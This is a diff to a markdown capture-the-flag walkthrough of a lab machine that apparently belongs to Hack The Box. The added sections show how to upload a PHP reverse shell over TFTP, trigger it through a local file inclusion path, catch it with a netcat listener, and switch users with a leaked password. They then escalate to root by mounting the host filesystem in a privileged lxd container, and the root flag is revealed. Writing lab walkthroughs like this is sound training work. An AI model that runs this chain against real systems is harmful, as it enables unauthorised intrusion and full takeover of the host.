@@ -15,9 +15,8 @@ tags:
   - webshell
   - LFI
   - TFTP
+  - PHP Reverse Shell
   - nc
-  - strings
-  - chmod
   - upgrade shell
   - nmap
 ---
@@ -128,7 +127,7 @@ PORT   STATE         SERVICE
 *69/udp open|filtered tftp*
 ```
 
-#Gain a foothold
+#Gain a foothold#
 
 I know TFTP is running so going to try and connect to that but need some basic commands
 
@@ -173,7 +172,7 @@ Sent 16 bytes in 0.1 seconds
 tftp> 
 
 ```
-Now to test if I can get to files placed in the tftp folder from the web browser
+##Now to test if I can get to files placed in the tftp folder from the web browser##
 
 ##Research:
 
@@ -192,6 +191,204 @@ this is a test
 <title></titl
 ...
 ```
+
+#Foothold with PHP reverse shell#
+
+Locate a good PHP reverse shell - https://github.com/pentestmonkey/php-reverse-shell
+
+save the reverse shell code as 55_rev.php and change the IP and Port to the ones it use
+
+Start netcat locally to listen one another shell *nc -nlvp 4321*
+
+then transfer via tftp the reverse shell php file to the target server
+```yaml
+┌──(root💀kali)-[/home/kali/http/shell]
+└─# tftp 10.10.10.55
+tftp> put 55_rev.php
+Sent 5678 bytes in 0.9 seconds
+tftp> 
+```
+
+Now connect to that file in the web browser and watch to get a reverse shell in the netcat session
+```yaml
+view-source:http://10.10.10.55/?file=../../../../var/lib/tftpboot/55_rev.php
+
+
+
+OTHER NC WINDOW
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4321      
+listening on [any] 4321 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.55] 49422
+Linux included 4.15.0-88-generic #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 03:02:14 up  1:21,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+We have a good foothold now lets improve our shell
+```yaml
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+
+the www-data account dow not have permissions so we need to try switching to the User Mike. try every knows password from previous servers
+
+su mike
+```yaml
+$ python3 -c "import pty; pty.spawn('/bin/bash')"
+www-data@included:/$ su mike
+su mike
+Password: Sheffield19
+
+mike@included:/$ 
+
+```
+Next I grabbed the flah in Mikes account and then use the TFTP server to pull over the LINUX Enum script file and run it from mikes account
+
+```yaml
+┌──(root💀kali)-[/home/kali/http/enum]
+└─# tftp 10.10.10.55
+tftp> put linenum.sh
+Sent 47983 bytes in 5.2 seconds
+tftp> 
+```
+Now that we have linenum.sh copied over to the tftp folder we move it to the home folder of user mike and then make it executable and finally run it. And find out the Mike is in the lxd group and that can be used for PE
+
+```yaml
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Aug  5  2019 .
+drwxr-xr-x 14 root root 4096 Mar  5  2020 ..
+
+
+[+] We're a member of the (lxd) group - could possibly misuse these rights!
+uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
+
+
+### SCAN COMPLETE ####################################
+mike@included:~$
+
+#Priv Elevation#
+
+Research lxd and find best thing to do is to follow instructions here on a new box and then copy the files over to finish the exploit.
+
+```yaml
+# lxd/lxc Group - Privilege escalation
+
+If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+
+## Exploiting without internet
+
+### Method
+
+You can install in your machine ( I made a second machine for this) this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)\(follow the instructions of the github\):
+
+```yaml
+#Install requirements
+sudo apt update
+sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
+#Clone repo
+go get -d -v github.com/lxc/distrobuilder
+#Make distrobuilder
+cd $HOME/go/src/github.com/lxc/distrobuilder
+make
+cd
+#Prepare the creation of alpine
+mkdir -p $HOME/ContainerImages/alpine/
+cd $HOME/ContainerImages/alpine/
+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+#Create the container
+sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
+
+##Copy those files to your Kali server for upload to the target
+```
+
+Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**
+
+##Use python http server to host the files and WGET to pull them over
+
+Add the image:
+
+```yaml
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list #You can see your new imported image
+```
+
+Create a container and add root path
+
+```yaml
+lxc init alpine privesc -c security.privileged=true
+lxc list #List containers
+
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+
+Execute the container:
+
+```yaml
+lxc start privesc
+lxc exec privesc /bin/sh
+cd /mnt/root/root
+id
+#Here is where the filesystem is mounted and we can see we are root
+```
+
+#this is what it looks like when you run the commands
+
+```yaml
+mike@included:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+mike@included:~$ lxc init alpine privesc -c security.privileged=true
+lxc init alpine privesc -c security.privileged=true
+Creating privesc
+mike@included:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+<st-root disk source=/ path=/mnt/root recursive=true
+Device host-root added to privesc
+mike@included:~$ lxc start privesc
+lxc start privesc
+mike@included:~$ lxc exec privesc /bin/sh
+lxc exec privesc /bin/sh
+~ # ^[[21;5Rcd /mnt/root/root
+cd /mnt/root/root
+/mnt/root/root # ^[[21;18Rls
+ls
+login.sql  root.txt
+/mnt/root/root # ^[[21;18Rcat root.txt
+cat root.txt
+c693d9c7499d9f572ee375d4c14c7bcf
+/mnt/root/root # ^[[21;18Rid
+id
+uid=0(root) gid=0(root)
+/mnt/root/root # ^[[21;18R
+```
+
+The last bit is to grab the info in the sql backup file which is the new credentials
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
